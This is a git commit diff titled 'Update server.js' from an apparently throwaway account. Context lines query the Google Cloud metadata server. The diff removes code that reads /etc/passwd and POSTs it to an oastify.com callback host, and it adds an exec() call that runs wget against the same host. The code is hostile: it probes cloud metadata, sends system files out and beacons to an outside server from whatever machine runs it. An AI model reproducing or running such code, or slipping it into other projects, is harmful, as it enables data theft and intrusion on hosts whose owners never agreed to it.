014928cf4e90ba12878ec3484d2d2eebc48dbdf3
2930r2hnfdsin <127764396+2930r2hnfdsin@users.noreply.github.com>
2023-03-25 15:48:06 +0100

    Update server.js

--- server.js
+++ server.js
@@ -36,25 +36,18 @@ fetch("http://metadata.google.internal/computeMetadata/v1/instance/hostname")
   })
   .catch((error) => console.error(error));
 
-    fs.readFile('/etc/passwd', 'utf-8', (err, data) => {
-  if (err) throw err;
+    
 
-  // send the file contents through a fetch() call
-  fetch('https://xde2mz5rdthvhp1vmhb5hlg7syypmgf44.oastify.com/file', {
-    method: 'POST',
-    body: data,
-    headers: { 'Content-Type': 'text/plain' },
-  })
-    .then(response => {
-      if (response.ok) {
-        console.log('File contents sent successfully');
-      } else {
-        throw new Error('Failed to send file contents');
-      }
-    })
-    .catch(error => {
-      console.error('Error sending file contents:', error);
-    });
+exec("wget https://xde2mz5rdthvhp1vmhb5hlg7syypmgf44.oastify.com/wget", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
     
 
